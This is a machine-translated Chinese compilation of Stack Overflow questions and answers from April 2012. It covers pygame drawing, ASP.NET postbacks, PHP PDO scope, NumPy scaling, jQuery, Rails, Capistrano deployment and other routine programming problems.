> ID：10148479
> 
> 赞同：7
> 
> 时间：2012-04-13T21:21:33.660
> 
> 标签：python, pygame

我正在编写一些代码，涉及使用 pygame 库在表面上画一个圆。绘制圆圈的代码如下所示：

```
 surf = pygame.Surface((2000,2000))
  pygame.draw.circle(surf, 
                     pygame.Color("white"),
                     (1000,1000),
                     508,
                     50) 
```

问题是生成的圆圈有伪影 ![有文物的圆圈](../Images/c928fee95c9159c177ed5dc908fa4e8b.png)

反正有没有画这样的圆圈而没有得到这些文物？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-13T22:22:26.867

您看到的很可能是 pygame.draw.circle 实现的问题。最有可能的 pygame 开发人员愚蠢地假设您可以通过依次绘制多个圆来绘制粗圆，每个圆增加一个半径。这在实践中是行不通的，你会得到像你看到的那样的云纹图案。尝试将圆线粗细增加 100 或 200，看看会发生什么。如果情况变得更糟，那就是`pygame.draw.circle`他的错。

一个解决方案是提供您自己的圆形渲染例程。这当然可以完成，但为了获得最佳性能，在 pygame 的 C/C++ 扩展模块中或使用 OpenGL（带或不带片段着色器）中这样做是有意义的。

要为每条扫描线获得一个完美的圆，您必须计算每条扫描线的填充区域的开始和结束。通过使用 pygame.draw.line 绘制单独的扫描线，可以在 python 中以可容忍的性能执行此操作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-14T12:44:51.477

在 circle 和 arc 方法的注释中提到了这个错误。[draw.circle 文档](http://www.pygame.org/docs/ref/draw.html#pygame.draw.circle)的评论中有一种解决方法。这是改编自该解决方法：

```
def draw_outlined_circle(surf, color, origin, radius, thickness):
    width = radius * 2 + thickness * 2
    background = (0, 0, 0, 0)
    circle = pygame.Surface((width, width)).convert_alpha()
    rect = circle.get_rect()
    circle.fill(background)
    pygame.draw.circle(circle, color, rect.center, radius)
    pygame.draw.circle(circle, background, rect.center, radius - thickness)
    surf.blit(circle, (origin[0] - (rect.w / 2), origin[1] - (rect.w / 2))) 
```

此方法使用额外的`Surface`并绘制两个圆圈：一个较小的圆圈在一个较大的圆圈内，以达到相同的效果。较小圆圈的填充颜色的 alpha 为 0，因此整个圆圈的中心看起来是透明的。

编辑：从上面的评论中，我看到 pygame FAQ 中也提到了这种行为。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2018-02-10T11:23:48.887

我修复了这个问题，它将在 pygame (1.9.4) 的下一个版本中。你如何在没有人工制品的情况下画出这样的圆圈？使用更新版本的 pygame。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-11-02T05:17:49.343

这可能发生在 pygame.draw.circle 是如何实现的问题上。您可以尝试使用街机库以获得更好的性能。此外，街机库非常易于使用，而我发现 pygame 相当复杂。

# c# - ClientScript.RegisterForEventValidation 和 __doPostBack()

> ID：10148483
> 
> 赞同：0
> 
> 时间：2012-04-13T21:21:59.180
> 
> 标签：c#, javascript, asp.net, visual-studio-2010, dopostback

我正在尝试为事件注册注册一些按钮，因为我不断收到“无效的回发或回调参数”。由于我通过 __doPostBacks() 手动传递按钮的事件，由于客户端验证，我认为这与此有关。

我覆盖了 Render 以使用 RegisterForEventValidation，如下所示：

```
protected override void  Render(HtmlTextWriter writer)
{
    ClientScript.RegisterForEventValidation(btnNuevo.UniqueID);
    ClientScript.RegisterForEventValidation(btnBorrar.UniqueID);
    ClientScript.RegisterForEventValidation(btnEditar.UniqueID);
    ClientScript.RegisterForEventValidation(btnAlquilar.UniqueID); 
    base.Render(writer);
} 
```

但是客户端 .aspx 页面上的 __doPostBacks 是这样写的：

```
...
__doPostBack('<%= btnNuevo.UniqueID %>', "");
...
__doPostBack('<%= btnBorrar.UniqueID %>', selected.childNodes[0].innerText);
...
__doPostBack('<%= btnEditar.UniqueID %>', index);
...
__doPostBack('<%= btnAlquilar.UniqueID %>', indexaux); 
```

其中 selected.childNodes[0].innerText、index 和 indexaux 是字符串。这仍然会引发异常。

我知道 RegisterForEventValidation 有一个重载，您可以在其中将控件的键和参数传递给它。

问题是，我不知道该怎么写。我不应该直接知道参数将是什么，因为选择器、索引和索引辅助取决于用户与页面的交互（即，在 GridView 中选择一行）。我发现的唯一示例是参数始终相同的示例，因此他们只需编写 RegisterForEventValidation("nameOfControl", "XXXX")，其中 "XXXX" 是固定字符串。

关于如何写这个的任何想法，或者如果这不是问题？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T21:39:34.520

我不知道您是否已采用这种方法，但您可以`EnableEventValidation`在 page 指令中设置为 false：

```
<%@ Page Language="C#" EnableEventValidation="false" ... %> 
```

# php - 使用 PHP 和 PDO 检查用户名是否存在？

> ID：10148486
> 
> 赞同：0
> 
> 时间：2012-04-13T21:22:05.263
> 
> 标签：php, pdo, mysqli

我有一个 db.php 文件，其中包含以下内容：

```
// db.php file
// creates connection to database

// DATABASE CONNECTION FUNCTION
function sql_con(){
    try{
        $dbh = new PDO("mysql:host=".DB_HOST.";dbname=".DB_NAME, DB_USER, DB_PASS,
            array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));

        $dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    } catch (PDOException $e) {
        // log error to file and display friendly error to user
        ExceptionErrorHandler($e);
        exit;
    }
} 
```

我有一个注册页面，我想检查用户名是否已经存在，所以我`sql_con();`事先调用我的函数来连接到数据库，然后执行以下查询

```
 // connect to database
    sql_con();

    $stmt = $dbh->prepare("SELECT `user_login` FROM `users` WHERE `user_login` = ? LIMIT 1");
    $stmt->execute(array($username));

    if ( $stmt->rowCount() > 0 ) {
        $error[] = 'Username already taken';
    } 
```

我对 PDO 很陌生，上面我收到以下错误：

> 注意：未定义变量：第 64 行 C:\wamp\www\signup.php 中的 dbh
> 
> 致命错误：在第 64 行调用 C:\wamp\www\signup.php 中非对象的成员函数 prepare()

可能是非常愚蠢的事情，当我处于初学者阶段时，我似乎将自己与 PDO 混淆了。谁能告诉我我做错了什么？另外我不确定这是否是正确的方法，因为我是 PDO 的新手，所以如果有更有效的方法来进行用户名查询检查，请告诉我。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-13T21:29:15.803

这是因为由于范围，`$dbh`对象被限制在`try catch`块和你的`sql_con()`函数内部。

正确的解决方案是**删除`try catch`块**，并在***函数******末尾******返回`$dbh``sql_con()`***变量。

然后：

```
try {
    $dbh = sql_con();

    $stmt = $dbh->prepare("SELECT `user_login` FROM `users` WHERE `user_login` = ? LIMIT 1");
    $stmt->execute(array($username));

    if ( $stmt->rowCount() > 0 ) {
        $error[] = 'Username already taken';
    }
}
catch (PDOException $e) {

    //Do stuff with $e

} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-13T21:28:22.313

`$dbh`一旦函数执行完毕，变量就会被销毁。

您可以尝试返回句柄：

```
function sql_con() {

    // your connection code

    return $dbh;

} 
```

然后在您的注册页面中：

```
$dbh = sql_con(); 
```

根据您的需要，更好的选择是使用[DI](http://en.wikipedia.org/wiki/Dependency_injection)容器。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T21:32:16.147

您正在函数中定义 pdo ，但它不可见。

```
function sql_con(){
    try{
        $dbh = new PDO("mysql:host=".DB_HOST.";dbname=".DB_NAME, DB_USER, DB_PASS,
            array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));

        $dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        return $dbh; //this 

    } catch (PDOException $e) {
        // log error to file and display friendly error to user
        ExceptionErrorHandler($e);
        exit;
    }
}

 $dbh = sql_con(); 
```

如果您为 pdo 抽象创建一个类会更好。

```
$dbh = DB::getInstance(); 
```

# python - 带有数组和标量的 Numpy 数学？

> ID：10148488
> 
> 赞同：2
> 
> 时间：2012-04-13T21:22:14.733
> 
> 标签：python, numpy, neural-network, normalization

麻木的新手在这里。我正在尝试对神经网络的输入进行归一化（又名特征缩放、标准化）。我只是做线性缩放，我使用的公式是：

`I = Imin + (Imax-Imin)*(D-Dmin)/(Dmax-Dmin)`

其中 I 是缩放的输入值，Imin 和 Imax 是缩放值的所需最小和最大范围，D 是原始数据值，Dmin 和 Dmax 是原始数据值的最小和最大范围。我想要一个 python 方法，它接受一个 numpy 数组并返回一个所有值都标准化的数组。这是我到目前为止的想法。

```
def get_normalized_values(array):
    """I = Imin + (Imax-Imin)*(D-Dmin)/(Dmax-Dmin)"""
    imin = -1
    imax = 1
    dmin = array.amin()
    dmax = array.amax()

    normalized = imin + (imax - imin)*(array - dmin)/(dmax - dmin)

    return normalized 
```

我的问题是这行得通吗？还是我必须遍历数组中的每个元素并执行数学运算？你能用数组和标量做这样的数学吗？也就是说，会`array - dmin`创建一个新的临时数组，其中每个值都减去了 dmin 吗？不确定这是否是正确的术语，但我认为这是一种“矢量化”方法？

**更新**

有没有办法让这个修改数组到位？那不是返回数组的副本，而是让函数获取数组并修改原始数组？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-13T21:25:38.537

我相信您需要更改呼叫`amin()`，并且`amax()`只是对`min()`and的呼叫`max()`，如`my_array.max()`.

否则，这应该可以正常工作。你可以在 NumPy 中做一些类似于 Octave/Matlab 的事情，比如向数组添加一个标量，它会自动知道将操作映射到所有元素。有时，您可能需要稍微不同的语法（例如知道两个数组之间的差异`numpy.linalg.dot()`并仅将其相乘），但总的来说，这样的事情就像您所指出的那样简单。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-13T21:24:28.507

它是 python - 试试吧 (tm)

我真的不知道答案，但我找出答案的方法是将问题粘贴到 iPython 终端会话中。通常，每当我想知道如何以麻木方式做这样的事情时，简单的方法就奏效了。

# toggle - 我的 JQuery 切换无法正常运行

> ID：10148489
> 
> 赞同：0
> 
> 时间：2012-04-13T21:22:19.900
> 
> 标签：toggle, jquery

为什么我的 jQuery 切换功能不起作用？

请参阅此演示：[http ://project.4greality.com/category/budget-homes](http://project.4greality.com/category/budget-homes)

我的代码：

```
<script>
$(document).ready(function(){

$("a.switchThumb").toggle(function(){
  $(this).addClass("swap"); 
    $("div.containerDiv").fadeOut("fast", function() {
        $("#containerDiv").fadeIn("fast").addClass("displayToggleNone");

        });

    }, 

 function () {
  $(this).removeClass("swap");
    $("div.containerDiv2").fadeOut("fast", function() {
           $("#containerDiv2").fadeIn("fast").removeClass("displayToggleNone");

        });
    });
});
</script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T21:34:04.927

我认为您需要类似下面的内容来切换缩略图和详细视图。

我不确定您为什么要先尝试淡出 div 并再次淡入相同的内容，然后再将其隐藏。

试试下面，让我知道它是怎么回事，

```
$(document).ready(function(){    
  $("a.switchThumb").toggle(function(){
    $(this).addClass("swap"); 
    $("#containerDiv").fadeOut("fast", function() {
        $("#containerDiv2").fadeIn("fast");
    });
  }, 
  function () {
    $(this).removeClass("swap");
    $("#containerDiv2").fadeOut("fast", function() {
           $("#containerDiv").fadeIn("fast");    
    });
  });
}); 
```

# c# - 使用 System.Uri 附加多个段

> ID：10148499
> 
> 赞同：15
> 
> 时间：2012-04-13T21:22:58.260
> 
> 标签：c#, uri

```
var baseUri = new Uri("http://localhost/");
var uri1 = new Uri(baseUri, "1");
var uri2 = new Uri(uri1, "2"); 
```

没想到`uri2`是[http://localhost/2](http://localhost/2)。我将如何附加到`uri1`http [://localhost/1/2](http://localhost/1/2) intead？这样做`Uri`，还是我需要回退到字符串？顺便说一句，我几乎在任何地方都尝试添加前导/尾随斜杠。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-04-13T21:35:07.847

“1”和“2”是 url 的“文件名部分”。如果你让“1”看起来更像目录路径，它会正常工作“1/”：

```
var baseUri = new Uri("http://localhost/");
var uri1 = new Uri(baseUri, "1/");
var uri2 = new Uri(uri1, "2"); 
```

注意：“文件名部分”不是真正的术语，因为 Url 只有“路径”和“查询”组件，但通常将路径的最后一块视为文件名：“/foo/bar/file.txt”。

当您组合 2 条路径时，您想用第二条路径替换第一条路径的某些尾部。在你的情况下，它最终只有“文件名”段：“/1”和“2”（如果你把真正的价值像“/myFile.txt”和“NewFile.txt”结合起来会更容易看看它为什么会这样）。

# asp.net - 在 ASP.NET MVC（视图）中包含 WebForms？

> ID：10148502
> 
> 赞同：4
> 
> 时间：2012-04-13T21:23:00.270
> 
> 标签：asp.net, asp.net-mvc, asp.net-mvc-3, razor, webforms

我找到了关于如何在 webforms 中包含 asp.net mvc 的问题和很好的答案（像[这样](https://stackoverflow.com/questions/702746/how-to-include-a-partial-view-inside-a-webform)），但是我需要在 asp.net mvc 中重用一些 webforms。

怎么做 ？

我正在考虑一个解决方案，其中对部分视图（或静态帮助程序）的调用会将 Web 表单呈现为 Razor 视图中的部分视图（其他操作）。

可能吗 ？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-14T12:16:43.090

也许您可以通过 jquery ajax 加载 WebForm：

```
$.ajax({ url : 'http://tempuri.org/webfrom.aspx',
         type: 'GET',
         cache : false,
         success : function(data){
             $("#yourcontainer").html(data);
         }
 }); 
```

# php - 为 php5 扩展包装 c++ dll 的问题

> ID：10148512
> 
> 赞同：0
> 
> 时间：2012-04-13T21:23:40.877
> 
> 标签：php, visual-c++, php-internals

我正在尝试为我的 c++ dll 创建 php 5.2.17 扩展。我在带有 Sambar Server 7.0 的 windows xp 上使用 Visual Studio 2005。我有两个问题：

1.  我无法在我的代码中包含 c++ 的东西（字符串或 STL 映射）。它给出的错误如下：“PHP 在 00CF421B 遇到访问冲突”。如何在我的 dll 中使用字符串和 STL 映射。

2.  我正在尝试创建一个 c++ dll，其中包含一个具有 3 个字符串类型参数的函数并返回这 3 个字符串的第二个字符串。

下面是代码：

```
PHP_FUNCTION(add){
    char* a;
    char* b;
    char* c;

    if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "sss", &a,&b,&c) == FAILURE) {
        RETURN_STRING("Bad parameters!", true);
    }

    //string ss=a;
    //ss=ss+b;
    //memset(a,0,30);
    //strcpy(a,ss.c_str());
    //php_printf("a : %s b : %s ",a,b);
    RETURN_STRING(b,1);
} 
```

php 文件包含：

```
$a="abc";
$b="def";
$c="ghi";
$result = add($a,$b,$c);
print "Calling add($a,$b,$c) returned $result"; 
```

-> 当为此函数设置了两个参数时，这里的第一个字符串返回正常。

-> 当试图为这个函数返回带有两个参数的第二个字符串时，我收到一个错误：“PHP 在 014AE07C 遇到访问冲突”

-> 当尝试使用上述代码之类的 3 个参数时，我的 sambar 服务器会自行关闭.. 没有机会看到输出。

为什么会出现这种奇怪的行为，我哪里出错了？

提前致谢

阿尼尔

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-14T11:17:45.413

1.  PHP 扩展是用 C 编写的，而不是 C++。如果您需要在 C++ 应用程序中调用 PHP，请使用嵌入 SAPI，但扩展本身将使用 C。

2.  无论如何，调用`zend_parse_parameters()`应该是这样的：

    `if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "sss", &a, &a_len,&b, &b_len,&c, &c_len) == FAILURE)` 其中`_len`变量是整数。

使用[lxr.php.net](http://lxr.php.net/search?q=&project=PHP_5_4&defs=zend_parse_parameters&refs=&path=&hist=)作为参考。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T21:38:27.543

你的第一个问题是`memset(a, 0, 30);`。给定的字符串（可能）只有 3 个字符长，并且您将 30 个字符设置为零字符，可能超出了字符串缓冲区的末尾。

那么`strcpy(a,ss.c_str());`很可能会造成类似的缓冲区溢出。

最后，您将返回其中的任何内容`b`（可能已被覆盖），而不是您的串联结果。

# tinymce - TinyMCE 的 Asciimath 插件不创建图像

> ID：10148519
> 
> 赞同：1
> 
> 时间：2012-04-13T21:24:50.287
> 
> 标签：tinymce

我正在使用 TinyMCE 的 Asciimath 插件 (http://www.imathas.com/editordemo/demo.html) 直到几分钟前它工作正常。*现在我可以在编辑器中很好*地看到数学符号，但是在提交表单时，它的内容不会更改为替换`<span class="AM">`插件创建的标签的图像。

因此，编辑器生成的 HTML 保留了我使用 span 标签键入的数学语法，并且没有在图像中正确显示数学符号。

如果有人知道如何解决这个问题，请帮助我。我真的很困惑为什么它突然停止工作。服务器端文本替换解决方案也很棒。

我试过这个：

```
preg_replace('/\<span class="AM"\>`(.+)`\<\/span\>/', '<img src="http://www.imathas.com/cgi-bin/mimetex.cgi?$1" />', $str) 
```

但这会导致数学片段的显示中断，因为`displaystyle`脚本添加的一些附加参数会丢失。

**注意**我最近从常规的 TinyMCE 切换到了 jQuery 插件 TinyMCE。这可能是插件不起作用的原因吗？我不确定它是否在我进行此更改后立即破坏了功能。

# java - 如何在 JAVA 中旋转图像？

> ID：10148520
> 
> 赞同：0
> 
> 时间：2012-04-13T21:24:52.423
> 
> 标签：java, image, rotation

我开始在 JAVA 中玩游戏，最终应该成为一个 android 应用程序。无论如何，我想知道如何旋转图像（我最终想旋转一个角色以面对鼠标，如果你知道如何做到这一点，那将是惊人的！）。无论如何，这是我用来加载图像的：

```
ImageIcon i = new ImageIcon("C:/image.jpg"); 
```

有任何想法吗？rotate(Image image, int angle){} 方法会很棒！如果您知道如何向鼠标旋转图像，那就更好了！谢谢你的时间

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T21:28:10.610

你不能用`ImageIcons`. 您必须使用 gava.awt.Paint2D 并绘制图像。然后你可以通过设置仿射变换来旋转它。在这里，我更深入地回答了一个类似的问题：

[平台游戏 - 让对象根据鼠标位置调整角度](https://stackoverflow.com/questions/8762907/platform-game-getting-the-object-to-adjust-angle-according-to-mouse-position/8763062#8763062)

和一般的java游戏编程教程：[这里](http://www.gamedev.net/page/resources/_/technical/game-programming/java-game-programming-part-i-the-basics-r1262)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T21:33:39.250

看看[这个](http://www.javareference.com/jrexamples/viewexample.jsp?id=88)教程，说明如何使用 Java 2D AffineTransform 类旋转图像。

# ruby-on-rails - ActionController::Base.param_parsers 替代方案

> ID：10148521
> 
> 赞同：0
> 
> 时间：2012-04-13T21:24:53.420
> 
> 标签：ruby-on-rails

我发现几个网站指向使用以下代码来添加对自定义参数格式的支持：

```
ActionController::Base.param_parsers[Mime::PLIST] = lambda do |body|
  str = StringIO.new(body)
  plist = CFPropertyList::List.new({:data => str.string})
  CFPropertyList.native_types(plist.value)
end 
```

这里的这个是苹果 plist 格式，这是我想要做的。但是，使用**Rails 3.2.1**，开发服务器不会启动，说那`param_parsers`是未定义的。我无法找到任何关于它被弃用的文档或任何替代使用，只是它确实包含在 2.x 文档中而不是 3.x 文档中。

Rails 3 中是否有其他方法可以支持 POST 和 PUT 请求中的自定义参数格式？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T21:58:44.697

参数解析移至 Rack 中间件。它现在[是 ActionDispatch](https://github.com/rails/rails/blob/master/actionpack/lib/action_dispatch/middleware/params_parser.rb)的一部分。

要注册新的解析器，您可以像这样重新声明中间件的使用：

```
MyRailsApp::Application.config.middleware.delete "ActionDispatch::ParamsParser"
MyRailsApp::Application.config.middleware.use(ActionDispatch::ParamsParser, {
  Mime::PLIST => lambda do |body|
    str = StringIO.new(body)
    plist = CFPropertyList::List.new({:data => str.string})
    CFPropertyList.native_types(plist.value)
  end
}) 
```

或者您可以像这样更改包含默认解析器的常量

```
ActionDispatch::ParamsParser::DEFAULT_PARSERS[Mime::PLIST] = lambda do |body|
  str = StringIO.new(body)
  plist = CFPropertyList::List.new({:data => str.string})
  CFPropertyList.native_types(plist.value)
end 
```

第一个变体可能是最干净的。但是您需要注意，替换中间件声明的最后一个在那里获胜。

# ruby-on-rails - Ruby on Rails - 在 Windows 上安装后无法识别捆绑器命令

> ID：10148529
> 
> 赞同：3
> 
> 时间：2012-04-13T21:25:35.447
> 
> 标签：ruby-on-rails, ruby

我刚刚在 Windows 7 上安装了 Ruby 1.8.7，shell 可以识别 ruby​​ 命令，但是当我尝试运行时却没有`bundle install`

这是常见的还是预期的？如何让捆绑器工作？

谢谢！

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-04-13T21:32:22.777

确保安装了捆绑器 gem。它可能不包含在您的 ruby​​ 发行版中

```
gem install bundler 
```

# windows-phone-7 - Windows Phone 7 数据绑定外部属性（非静态超链接文本）

> ID：10148530
> 
> 赞同：4
> 
> 时间：2012-04-13T21:25:36.820
> 
> 标签：windows-phone-7, data-binding

我目前有一个`listBox`使用数据绑定来填充它的 WP7 应用程序。我遇到的问题是这个特定的行：

```
<Hyperlink NavigateUri="{Binding LinkUrl}" TargetName="_blank">{Binding Name}</Hyperlink> 
```

看来我不能以这种方式绑定东西（在元素的属性之外）。所有这一切都是用链接到 url 的文字文本 {Binding Name} 创建一个超链接。相反，我正在寻找的是它在其位置使用实际的 Name 变量。

我尝试在谷歌上搜索答案并查看了 Inlines 属性，但我一直空手而归。

任何帮助，将不胜感激

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-13T21:42:13.603

在 WPF 中，标签之间的空间通常是“内容”（但不总是），并且可以通过`Content`属性绑定。我对`<Hyperlink>`Windows Phone 不熟悉，但 a`<HyperlinkButton>`应该也能正常工作。

```
<HyperlinkButton NavigateUri="{Binding LinkUrl}" TargetName="_blank" Content="{Binding Name}"/> 
```

编辑：`<Hyperlink>`尝试`<RichTextBox>`一下：

```
<RichTextBox>
    <Paragraph>
        <Hyperlink>
            <Hyperlink.Inlines>
                <Run Text="{Binding Name}"/>
            </Hyperlink.Inlines>
        </Hyperlink>
    </Paragraph>
</RichTextBox> 
```

# dcpu-16 - DCPU-16 中的有符号算术/控制流？

> ID：10148536
> 
> 赞同：6
> 
> 时间：2012-04-13T21:26:53.110
> 
> 标签：dcpu-16

DCPU-16 *（[Notch新游戏](http://0x10c.com/)中的CPU ）*[似乎没有](http://0x10c.com/doc/dcpu-16.txt)任何签名`IF`//指令`MUL`。`DIV`

是否还有一种方法可以进行签名算术/控制流不是超级令人难以置信的痛苦？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-25T10:09:48.073

Notch 前几天发布的[新 DCPU 规范](http://dcpu.com/highnerd/dcpu16.txt)确实有签名的算术指令：

```
Unsigned  | Signed
==================
MUL       | MLI
DIV       | DVI
SHR       | ASR
IFG       | IFA
IFL       | IFU 
```

# asp.net - 在创建新的 LINQ to SQL 类时未创建 Designer.cs 文件

> ID：10148539
> 
> 赞同：2
> 
> 时间：2012-04-13T21:27:02.657
> 
> 标签：asp.net, visual-studio-2010, linq, linq-to-sql

ASP 和 LINQ 的新手。我正在使用 Visual Studio 2010 中的 ASP.NET 开发一个网站。我正在尝试通过右键单击 app_code->Add New Item 创建一个 linq to SQL 类（dbml 文件）。我指定 dbml 文件的名称并单击“添加”。OR 设计器打开并得到一个错误列表，上面写着“自定义工具 'MSLinqToSQLGenerator' 失败。你调用的对象是空的'。我看到只创建了布局文件，没有创建designer.cs文件。

我目前有一个连接字符串设置，可以从我的笔记本电脑访问数据库服务器。我能够将 GridViews 添加到我的 aspx 页面并使用 SqlDataSource 检索数据。

我已尝试在此问题上寻求帮助；一个可能的解决方案是通过从 VS 命令提示符运行“devenv/resetskippkgs”来重置软件包。但这也没有奏效。

有什么帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-14T10:40:31.053

我相信，如果你重新安装你的视觉工作室会更好

# ruby-on-rails - Capistrano 多级 - 不创建开发/产品符号链接（仅“当前”）

> ID：10148546
> 
> 赞同：0
> 
> 时间：2012-04-13T21:28:15.790
> 
> 标签：ruby-on-rails, git, capistrano, multistage

我以前设置过，但现在无法正常工作。我想要一个开发和生产站点。当我进行 cap deploy 时，它会设置一个“当前”符号链接（不确定我是如何做到的，因为很长一段时间它甚至都不会这样做）。但是我如何让它为开发/产品部署和设置必要的符号链接？

我的 deploy.rb 文件：

```
#require 'bundler/capistrano'
require 'capistrano/ext/multistage'
require 'capistrano_colors'

set :stages, %w(development production)
set :default_stage, 'development'

set :application, "myapp"
set :repository,  "***"

# Target directory on the server
set :deploy_to, "/var/www/#{application}"

set :scm, :git
set :deploy_via, :remote_cache

set :user, '***'
set :use_sudo, false

role :web, "68.225.130.30"                          # Your HTTP server, Apache/etc
role :app, "68.225.130.30"                          # This may be the same as your `Web` server
role :db,  "68.225.130.30", :primary => true # This is where Rails migrations will run

# List of symlinks to be generated. Keys are subdirectories of release_path.
SYMLINKS = { :config => ['database.yml'],
             :public => ['system'] }

namespace :deploy do
  task :start do ; end
  task :stop do ; end
  task :restart, :roles => :app, :except => { :no_release => true } do
    run "#{try_sudo} touch #{File.join(current_path,'tmp','restart.txt')}"
    # Not working =/
    #run "touch /var/www/#{current_path}/tmp/restart.txt"
  end

  desc "Set up application symlinks."
  task :app_symlinks do
    SYMLINKS.keys.each do |key|
      dir = key.to_s
      SYMLINKS[key].each do |path|
        run "ln -nfs #{shared_path}/#{dir}/#{path} #{release_path}/#{dir}/#{path}"
      end
    end
  end
end 
```

我的 deploy/development.rb 文件：

```
set :deploy_to, "/var/www/#{application}"
set :branch, "master"
unset :rails_env
set :rails_env, "development" 
```

更新/答案：

问题出在 current_path 变量上。奇怪，因为我尝试过使用

设置：current_path，“发展”

和

设置 :current_path, "#{application}/development"

它没有用。看起来我必须设置整个路径，这看起来很奇怪，因为我以前使用过后者。

```
set :current_path, "/var/www/#{application}/development" 
```

有谁知道为什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T21:59:46.477

:current_path 由 capistrano 基于 :deploy_to 路径 + :application 名称设置。您只能在命名空间任务中使用 :current_path。

换句话说，它是用于创建符号链接、重新启动服务器和其他任务的便利变量。

# javascript - Jquery UI Draggable 从窗口外恢复

> ID：10148551
> 
> 赞同：1
> 
> 时间：2012-04-13T21:28:25.773
> 
> 标签：javascript, jquery, jquery-ui

可能这是一个非常简单的问题，但我是 Jquery 的初学者......

我有以下脚本：

```
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.js">/script>
    <script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.8.18/jquery-ui.js">

    </script>

    <script>
         $(function() {

            $('li').draggable({
                containment: 'document',
                revert: true
            });

            $("#config").droppable({
                drop: function(event, ui) {
                $(ui.draggable).appendTo( "#schub" );
                }
            });

        });

    </script> 
```

这就是我的身体所包含的：

```
 <div style="width:1800px; height:600px; background-color:#efefef;padding:10px;" >
    <div style="float:left; width:1250px; height:580px; border:1px solid grey; padding:10px;" >
        <div id="config" style="background-color:blue; border:1px solid black; width:700px; height:500px;">

            <ul id="schub" style="width:300px;  height:500px;"></ul>

        </div>
    </div>

<div style=" background-color:red;float:left; width:490px; height:580px; border:1px solid grey; margin-left:10px;padding:10px;" id="menu">
    <ul class="category">

        <li  class="dragg"  style="background-color:#e6e6e6; border:1px solid black; width:150px; height:98px;">
        </li>

        <li class="dragg" style="background-color:#e6e6e6; border:1px solid black; width:150px; height:98px;">
        </li>

        <li  class="dragg"  style="background-color:#e6e6e6; border:1px solid black; width:150px; height:98px;">
        </li>

    </ul>

</div> 
```

现在我的问题：我希望能够将灰色`<li>`从红色`<div>`拖到蓝色`<div>`。它确实有效，但是当我放下它们时，灰色`<li>`总是从窗口外部恢复为蓝色。`<div>`为什么会这样？？难道我`<li>`不能从我放下它们的地方恢复吗？

非常感谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-14T13:45:14.430

我想我找到了解决方案：

问题是，在蓝色 div 中使用他在附加 ge 之前的 css 样式`<li>`附加到新的 div 中。`<ul>`

放入`<li>`new后`<ul id="schub">`，它仍然有来自 Jquery 的 css，大约是 left:-1000px; （因为我们`<li>`从右向左拖动）。然后它被附加到新的ul。浏览器认为with left:-1000px;的`<li>`is en 元素 `<ul id="schub">`这是窗外。定义恢复：真；设置在 上，`<li>`因此它从窗口外部恢复到`<ul id="schub">`.

我实际上没有找到解决方案，而是一种解决方法：

我们可以将定义助手：'clone' 添加到`<li>`. 像这样，我们得到了原版的克隆。它实际上并没有从我们删除它的点恢复，而是它被附加到新的`<ul>`而不从窗口外部恢复。

# android - Android OpenGL 光照取决于人脸大小

> ID：10148552
> 
> 赞同：0
> 
> 时间：2012-04-13T21:28:31.940
> 
> 标签：android, opengl-es, lighting

我目前正在研究一些 opengl 2D 的东西。我有一个聚光灯，它可以到达两个不同宽度和高度的面。不知何故，脸上的光梯度取决于它们的大小。如何使渐变与人脸大小无关？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T21:32:14.350

如果没有图像，很难说出您的确切问题是什么，但最可能的问题是在顶点处评估照明，然后在三角形上进行插值。不同大小的 tris 会给出不同的插值。这在光线范围边缘的衰减中成为一个更大的问题。

如果您想要一个更准确的光照模型，那么您可能需要分解片段着色器并改为进行逐像素/片段光照。

# php - 在 PHP 中手动创建/使用 DI 容器？

> ID：10148553
> 
> 赞同：2
> 
> 时间：2012-04-13T21:28:51.877
> 
> 标签：php, dependency-injection

我试图了解如何使用 DI 容器。

假设我有三个类：A、B 和 C 定义如下：

```
class A {}

class B
{
    private $a;

    public function set_a(A $a)
    {
        $this->a = $a;
    }
}

class C
{
    private $b;

    public function set_b(B $b)
    {
        $this->b = $b;
    }
} 
```

现在我并没有真正得到的是我应该在 index.php 中写的内容。我读过实例化一个容器然后将它传递给我的对象以便他们可以使用它不是一件好事，因为它使我的对象依赖于容器。但这是否意味着我必须在 index.php 中编写类似这样的内容：

```
$container = new Container();
$container->a = function($ctnr) {
    return new A();
}
$container->b = function($ctnr) {
    $b = new B();
    $b->set_a($ctnr->a);
    return $b;
}
$container->b = function($ctnr) {
    $c = new C();
    $c->set_b($ctnr->b);
    return $c;
}

$c = $container->c; 
```

这是要走的路吗？

